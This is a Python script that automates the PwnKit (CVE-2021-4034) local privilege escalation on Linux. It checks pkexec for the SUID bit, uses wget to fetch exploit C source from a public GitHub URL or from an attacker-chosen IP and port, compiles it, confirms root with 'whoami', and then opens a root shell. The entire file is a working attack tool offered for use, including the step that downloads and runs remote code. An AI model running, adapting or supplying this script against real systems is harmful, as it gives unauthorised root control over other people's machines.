import os, stat, subprocess, sys, time, argparse
from urllib.parse import urlparse

suid_path = os.stat("/usr/bin/pkexec")

max_retries = 2

url = "https://raw.githubusercontent.com/ly4k/PwnKit/refs/heads/main/PwnKit.c"

file_name = "PwnKit.c"

binary = "PwnKit"

        
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--ip', help='Your machine ip address', metavar='')
parser.add_argument('-p', '--port', help='Port for your ip', metavar='', default='80')
parser.add_argument('-f', '--file', help='Please Make Sure The Same Name As Your File.', metavar='')
parser.add_argument('-o', '--output', help='Output File', metavar='')
parser.add_argument('--verify', help='Check If The System Have The Binary..', required=False, action='store_true')
args = parser.parse_args()
        




def process(text, count):
    for i in range(1, count + 1):
        print("{}{}".format(text, "." * i), end="\r")
        time.sleep(0.8)


def file_permission(file_name):
    subprocess.run(["chmod", "+x", file_name], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)



def get_shell(file_name):
    import os.path
    
    list_of_pwnkits = ['PwnKit', 'pwnkit', 'PWNKIT','Pwnkit','PWNkit','pwnKIT', 'pk']
    if file_name.split('.')[-1] == 'c':
        compiling = ["gcc", "-shared", file_name, "-o", binary, "-Wl,-e,entry", "-fPIC"]
        subprocess.run(compiling, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        exploiter = subprocess.Popen(
                                      ["./{}".format(binary), 'whoami'],
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
                                                  
        stdout, stderr = exploiter.communicate()
        return stdout.decode()
        
    elif os.path.splitext(file_name)[1][1:].strip().lower() == "":
        file_permission(file_name)
        exploiter = subprocess.Popen(
                                  ["./{}".format(file_name), 'whoami'],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
                                                  
        stdout, stderr = exploiter.communicate()
        return stdout.decode()
     
    elif file_name.split('.')[-1] not in list_of_pwnkits:
        print("[!] THIS EXPLOIT IS JUST FOR PWNKIT (CVE-2021-4034).")
        exit(0)
        
    else:
        print("[!] THIS EXPLOIT IS JUST FOR PWNKIT (CVE-2021-4034).")
        exit(0)


def from_server(ip, port):
    for attempt in range(1, max_retries + 1):
        try:
            if args.output:
                result = subprocess.run(
                    ["wget", "-q", "-O", args.output, "http://{}:{}/{}".format(ip, port, args.file)],
                    timeout=5,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)
                if result.returncode == 0:
                    print("\n[!] Download File Successful.")
                    time.sleep(1)
                    process("exploiting", 7)
                    root = get_shell(args.output)
                    if 'root' in root:
                        print("\nEnjoy Your Root Shell :)")
                        time.sleep(1)
                        os.system('./{}'.format(args.output))
                        exit(0)
                    else:
                        print("\nExploit failed. Maybe the target not vulnerable.")
                        exit(0)
            else:
                result = subprocess.run(
                        ["wget", "-q", "http://{}:{}/{}".format(args.ip, args.port, args.file)],
                        timeout=5,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)
                if result.returncode == 0:
                    print("\n[!] Download File Successful.")
                    time.sleep(1)
                    process('exploiting', 7)
                    path = urlparse(args.file).path
                    file_name = os.path.basename(path)
                    root = get_shell(file_name)
                    if 'root' in root:
                        print("\nEnjoy Your Root Shell :)")
                        time.sleep(1.5)
                        os.system('./{}'.format(binary))
                        exit(0)
                    else:
                        print("\nExploit failed. Maybe the target not vulnerable.")
                        exit(0)
        except subprocess.TimeoutExpired:
            print("\n[!] I think you have a problem with connection.")
            print("[!] Please fix your internet connection, or upload the file from your server.")
            exit(0)



def getter():

    for attempt in range(1, max_retries + 1):
        try:
            result = subprocess.run(
                    ["wget", "-q", "-O", file_name, url],
                    timeout=5,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)
            if result.returncode == 0:
                try:
                    print("\n[!] Download File Successful.")
                    time.sleep(1)
                    root = get_shell(file_name)
                    process('exploiting', 7)
                    if 'root' in root:
                        print("\nEnjoy Your Root Shell :)")
                        time.sleep(1.5)
                        os.system('./{}'.format(file_name))
                        exit(0)
                    else:
                        print("\nExploit failed. Maybe the target not vulnerable.")
                        exploiter.kill()
                        exit(0)
                                            
                except subprocess.CalledProcessError as e:
                    print("\n[x] Exploit failed. Maybe the target is not vulnerable.")
                    if e.stderr:
                        print("[x] {}".format(e.stderr.decode().strip()))
                        exit(0)
                except FileNotFoundError as e:
                    print("\n[x] Command not found: {}".format(e))
                    exit(0)
                except Exception as e:
                    print("\n[x] Unexpected error: {}".format(e))
                    exit(0)
        except subprocess.TimeoutExpired:
            print("\n[!] I think you have a problem with connection.")
            print("[!] Please fix your internet connection, or upload the file from your server.")
            print("[INF] IF YOU WANT TO DOWNLOAD FROM YOUR SERVER USE, [--help] TO SEE THE HELP MENU !")
            exit(0)
    

def informations():
    try:
        if suid_path:
            print("[*] Pkexec File Exist, Checking if have suid permission...")
            suid = suid_path.st_mode & stat.S_ISUID
            if suid != 0:
                print("[!] File Have Suid Permission!")
                print("[*] Please Be Patient You Will Have Your Shell soon If The Target Vulnerable.")
                time.sleep(1)
            else:
                print("[!] File Has Not SUID Permission.")
                exit(0)
    except FileNotFoundError:
        print("File does not exist: {}".format(suid_path))
        exit(0)


def vuln_checker():
    try:
        if suid_path:
            print("[*] Pkexec File Exist, Checking if have suid permission...")
            suid = suid_path.st_mode & stat.S_ISUID
            if suid != 0:
                print("[!] File Have Suid Permission!")
                print("[~] If you want to try exploit it, Use [-h/--help] For Help Menu.")
                print("[INF] IF YOU RUN THE SCRIPT WITHOUT ARGUMENT, IT WILL DOWNLOAD AUTOMATICALLY THE SOURCE EXPLOIT AND TRY TO EXPLOIT IT .")
                exit(0)
            else:
                print("[!] File Has Not SUID Permission.")
                exit(0)
    except FileNotFoundError:
        print("File does not exist: {}".format(suid_path))
        exit(0)



def main():

    if args.verify:
        vuln_checker()
        
    if len(sys.argv) != 1:
        print("[*] If Your Connection Is Good, Please Be Patient You Will Have Your Shell soon If The Target Vulnerable.")
        time.sleep(3)
        process("[*] {} Downloading".format(args.file), 5)
        from_server(args.ip,args.port)
        
    else:
        informations()
        getter()


if __name__=="__main__":
    main()

